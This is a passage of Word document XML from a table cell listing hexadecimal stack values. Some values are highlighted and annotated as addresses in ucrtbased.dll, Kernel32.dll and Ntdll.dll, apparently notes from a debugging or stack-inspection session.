            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F81C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A81817B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB56B38 </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05513E41" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18CDECAD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB5688E </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EFD7101" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BE50A21" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000003</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CC27ADE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BF0592F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>01201C11</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E9A454E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F618406" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7FFD3000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B12A6FB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F838</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="459CCBFE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F838</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B4A9CD3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB05F11 </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="686F246A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000003</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AD4E794" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0120314C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24C4CFEA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB05F1D </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D6911DC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>200A59FC</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32DEF432" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F844</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E4B02BF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB4B6D2 </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EB53866" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000001</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="594160D1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F868</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C2C21DF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>01201C21</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="041C29BA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47798383" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB08273 </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BB7023F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00003000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56DDF391" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BD5E2DC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">6CB0828B </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; ucrtbased.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="776CDBF3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000002</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="263EE4CD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F8AC</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55DC5920" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>01201D1B</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0153F380" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000001</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CB124EF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0020ABB0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02E2977B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>002097E0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49DA0091" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>21AD83B3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B54A9AF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09FE800F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03837EFE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>7FFD3000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66AB8AF2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F800</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DFE5A5A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01DD12E1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1929EF99" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F878</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78D97A5A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A37C143" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F8E8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57FDF6D6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>012023BB</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44F3653B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>209840BF</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="487F5B14" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58D5F584" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F8B8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2338AE55" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76E4EF6C</w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve"> -&gt; Kernel32.dll -&gt; Offset: 4 EF6C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5084C380" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>7FFD3000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="104CF06D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F8F8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72B040CA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">77A63618 </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; Ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EB27240" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>7FFD3000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ED5FE9B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77BEDB53</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="029555CE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36097CFA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="250C650E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7FFD3000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="678D9995" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E49DE9E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32EE260C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75365B3F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0015F8C4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41576544" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
